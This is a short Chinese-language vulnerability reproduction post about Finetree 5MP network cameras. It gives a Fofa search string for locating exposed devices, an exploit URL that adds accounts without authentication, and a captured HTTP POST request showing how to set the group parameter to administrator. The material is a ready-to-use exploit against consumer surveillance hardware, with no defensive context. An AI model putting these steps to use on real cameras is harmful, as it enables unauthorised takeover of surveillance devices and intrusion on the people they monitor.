> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rcXF5rvHwhv29TlFeB2OIA)

**Fofa 搜索：https://fofa.so/**

app="Finetree-5MP-Network-Camera"  

![](https://mmbiz.qpic.cn/mmbiz_png/PrTu58FA79Yg35XTUBlvZibF5lUvEaBcmjb8mMffpUa5WaicVFGZClibJInLNE2b9YTgzYiaibbAeM09zwIBrYMT3DQ/640?wx_fmt=png)

漏洞复现

未授权访问添加 [未登录状态的]

exp：http://ip:port/quicksetup/user_pop.php?method=add

添加回出现报错，不用管，直接登录即可

![](https://mmbiz.qpic.cn/mmbiz_png/PrTu58FA79Yg35XTUBlvZibF5lUvEaBcmjY0D2vpf6PsNI6MXzWI7VWVyZ9L2Zb8owKlBlWn9bIjm0eAia9fvKNg/640?wx_fmt=png)

另一个漏洞：  

已知低权限更改高权限，添加用户，用 burp 抓包看看什么情况

添加一个测试账号，test, 得到的请求包是这样：

```
1 POST /quicksetup/user_update.php HTTP/1.1
 2 Host: x.x.x,x:8086
 3 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
 4 Accept: */*
 5 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 6 Accept-Encoding: gzip, deflate
 7 Content-Type: application/x-www-form-urlencoded
 8 Content-Length: 52
 9 Origin: http://x.x.x.x:8086
10 Connection: close
11 Referer: http://x.x.x.x:8086/quicksetup/user_pop.php?method=add
12 Cookie: PHPSESSID=g02lv1iu0aod4ao75ioil2m0m3
14 method=add&user=test&pwd=123456&group=1&ptz_enable=0
```

以上 ip 经过处理

group 是组，1 代表 guest,2 是 operator,3 是 administrator，截断修改 group= 可以修改为管理员权限。

![](https://mmbiz.qpic.cn/mmbiz_png/PrTu58FA79bWnqtm0DovVvtkz3A8Lu0pZzgpkKqqfcphxmQDRj6pmbfd2fPu0e4HkcSA87ds4zJjksTkcxzdZA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/PrTu58FA79arIQGU74rJvbDtBoicQlQ8rRztCvXRfJR3OFmyBS0A21eDnAcj4VROWoKia7SyWCfu388aWyfGEo8Q/640?wx_fmt=png)